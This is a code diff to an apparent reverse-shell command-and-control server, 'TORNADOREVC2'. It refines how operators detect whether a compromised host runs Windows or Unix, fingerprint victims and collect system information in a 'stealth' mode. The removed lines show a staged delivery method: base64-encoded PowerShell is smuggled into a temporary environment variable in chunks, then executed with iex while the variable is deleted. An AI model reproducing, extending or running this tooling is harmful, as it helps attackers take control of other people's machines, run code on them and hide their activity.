@@ -4,7 +4,6 @@ import datetime
 import hashlib
 import os
 import re
-import secrets
 import select
 import socket
 import ssl
@@ -13,6 +12,13 @@ import sys
 import threading
 import time
 from threading import Lock
+
+from .win_client import (
+    infer_type_from_sysinfo,
+    probe_windows_platform,
+    send_powershell_script,
+    text_suggests_windows,
+)
 
 try:
     import readline
@@ -296,7 +302,7 @@ class TORNADOREVC2:
                     return ""
                 data += chunk
                 if until_marker and until_marker.encode() in data:
-                    deadline = time.time() + 0.5
+                    deadline = time.time() + 1.5
                     continue
                 if not until_marker:
                     deadline = min(deadline, time.time() + 0.3)
@@ -367,31 +373,8 @@ class TORNADOREVC2:
         return None
 
     def _send_win_ps(self, client_sock, script, stage_timeout=3.0):
-        """Deliver a PowerShell script, chunking when EncodedCommand exceeds cmd-line limits."""
-        cmd = self._win_ps_cmd(script)
-        if cmd:
-            return self.send_to_revshell(client_sock, cmd)
-
-        encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
-        var = f"T{secrets.token_hex(4)}"
-        chunk_size = 2000
-        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
-        for idx, chunk in enumerate(chunks):
-            esc = chunk.replace("'", "''")
-            stage_ps = f"$env:{var}='{esc}'" if idx == 0 else f"$env:{var}+='{esc}'"
-            stage_cmd = self._win_ps_cmd(stage_ps)
-            if not stage_cmd or not self.send_to_revshell(client_sock, stage_cmd):
-                return False
-            self.recv_output(client_sock, timeout=stage_timeout)
-
-        run_ps = (
-            f"$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($env:{var}));"
-            f"Remove-Item Env:{var} -EA 0;iex $s"
-        )
-        run_cmd = self._win_ps_cmd(run_ps)
-        if not run_cmd or not self.send_to_revshell(client_sock, run_cmd):
-            return False
-        return True
+        """Deliver a PowerShell script, chunking via the interactive shell when needed."""
+        return send_powershell_script(self, client_sock, script, stage_timeout=stage_timeout)
 
     def _win_ps_inline(self, script):
         escaped = script.replace('"', '`"')
@@ -445,6 +428,8 @@ class TORNADOREVC2:
     ):
         start_mark = start_mark or XFER_MARK_START
         end_mark = end_mark or XFER_MARK_END
+        if shell_type == 'unknown':
+            shell_type = self.resolve_shell_type(client_sock)
         self._flush_shell(client_sock)
         if shell_type == 'windows':
             if not self._send_win_ps(client_sock, win_ps_script):
@@ -452,7 +437,10 @@ class TORNADOREVC2:
         elif not self.send_to_revshell(client_sock, unix_cmd):
             return None
         output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
-        return self._extract_marked(output, start_mark, end_mark, strip_ws)
+        payload = self._extract_marked(output, start_mark, end_mark, strip_ws)
+        if payload is not None and shell_type in ('windows', 'unix'):
+            self._pin_shell_type(client_sock, shell_type)
+        return payload
 
     def _get_client_by_id(self, client_id):
         with self.client_lock:
@@ -623,7 +611,9 @@ class TORNADOREVC2:
         return self.transfer.verify_file(client_sock, remote_path)
 
     def collect_sysinfo(self, client_sock, shell_type='unknown', mode='stealth'):
-        timeout = 25.0 if mode == 'full' else 12.0
+        timeout = 30.0 if mode == 'full' else 12.0
+        if shell_type == 'unknown':
+            shell_type = self.resolve_shell_type(client_sock)
         self._flush_shell(client_sock)
         unix_cmd, win_ps = build_collect_commands(shell_type, mode=mode)
 
@@ -637,20 +627,19 @@ class TORNADOREVC2:
             else:
                 return None
             output = self.recv_output(client_sock, timeout=timeout, until_marker=SYSINFO_MARK_END)
-            return extract_sysinfo(output)
+            info = extract_sysinfo(output)
+            if info:
+                self._pin_shell_type(client_sock, st)
+            return info
 
         if shell_type == 'windows' and win_ps:
             return _collect('windows', None, win_ps)
         if shell_type == 'unix' and unix_cmd:
             return _collect('unix', unix_cmd, None)
-        for st in ('unix', 'windows'):
+        for st in ('windows', 'unix'):
             u, w = build_collect_commands(st, mode=mode)
             info = _collect(st, u, w)
             if info:
-                with self.client_lock:
-                    cinfo = self.revshell_clients.get(client_sock)
-                    if cinfo and cinfo.get('type') == 'unknown':
-                        cinfo['type'] = st
                 return info
         return None
 
@@ -684,7 +673,7 @@ class TORNADOREVC2:
             or info.get('sysinfo', {}).get('collection_mode') != mode
         )
         if need_collect:
-            shell_type = info.get('type', 'unknown')
+            shell_type = self.resolve_shell_type(client_sock, info)
             collected = self.collect_sysinfo(client_sock, shell_type, mode=mode)
             if collected and collected.get('error'):
                 print(f"{c['red']}Sysinfo collection error: {collected['error']}{c['end']}")
@@ -754,14 +743,42 @@ class TORNADOREVC2:
         return ids
 
     def infer_platform(self, output):
-        osver = output.lower()
-        if "windows" in osver or "microsoft" in osver or "c:\\" in osver:
+        if text_suggests_windows(output):
             return "windows"
+        osver = output.lower()
         if "uid=" in osver or "linux" in osver or "bsd" in osver:
             return "unix"
         if "busybox" in osver or "/bin/sh" in osver:
             return "unix"
         return "unknown"
+
+    def resolve_shell_type(self, client_sock, info=None):
+        """Return session shell type; probe Windows when unknown without downgrading known types."""
+        info = info or self._client_info(client_sock)
+        if not info:
+            return 'unknown'
+        current = info.get('type', 'unknown')
+        if current in ('windows', 'unix'):
+            return current
+        hinted = infer_type_from_sysinfo(info.get('sysinfo') or {})
+        if hinted:
+            self._pin_shell_type(client_sock, hinted)
+            return hinted
+        if info.get('_win_probe_done'):
+            return current
+        info['_win_probe_done'] = True
+        if probe_windows_platform(self, client_sock):
+            self._pin_shell_type(client_sock, 'windows')
+            return 'windows'
+        return info.get('type', 'unknown')
+
+    def _pin_shell_type(self, client_sock, shell_type):
+        if shell_type not in ('windows', 'unix'):
+            return
+        with self.client_lock:
+            info = self.revshell_clients.get(client_sock)
+            if info is not None:
+                info['type'] = shell_type
 
     def _probe_identity(self, client_sock, shell_type):
         """Collect hostname, username, and machine ID for session fingerprinting."""
@@ -790,9 +807,10 @@ class TORNADOREVC2:
                 start_mark=IDENT_MARK_START, end_mark=IDENT_MARK_END, strip_ws=False,
             )
         else:
-            for st in ('unix', 'windows'):
+            for st in ('windows', 'unix'):
                 identity = self._probe_identity(client_sock, st)
                 if identity:
+                    self._pin_shell_type(client_sock, st)
                     return identity
             return {}
 
@@ -1213,11 +1231,16 @@ class TORNADOREVC2:
 
         self.send_to_revshell(
             client_sock,
-            "uname -a 2>/dev/null || ver || cmd /c ver",
+            "uname -a 2>/dev/null; echo __T_PROBE__; ver 2>&1; cmd /c ver 2>&1; echo __T_PROBE_END__",
         )
-        probe_output = self.recv_output(client_sock)
+        probe_output = self.recv_output(client_sock, timeout=4.0, until_marker='__T_PROBE_END__')
         inferred = self.infer_platform(probe_output)
+        if inferred == 'unknown' and probe_windows_platform(self, client_sock):
+            inferred = 'windows'
         client_info['type'] = inferred
+        if inferred == 'windows':
+            from .win_client import detect_windows_shell_kind
+            client_info['win_shell'] = detect_windows_shell_kind(self, client_sock)
         client_info['identity'] = self._probe_identity(client_sock, inferred)
 
         term = TerminalManager(
@@ -1247,6 +1270,13 @@ class TORNADOREVC2:
             client_info['id'] = client_id
             client_info['name'] = prior.get('name')
             client_info['sysinfo'] = prior.get('sysinfo')
+            prior_type = prior.get('type')
+            if prior_type in ('windows', 'unix'):
+                client_info['type'] = prior_type
+            elif inferred == 'unknown':
+                hinted = infer_type_from_sysinfo(client_info.get('sysinfo') or {})
+                if hinted:
+                    client_info['type'] = hinted
             if prior.get('identity') and not client_info.get('identity'):
                 client_info['identity'] = prior.get('identity')
             client_info['fingerprint'] = fingerprint
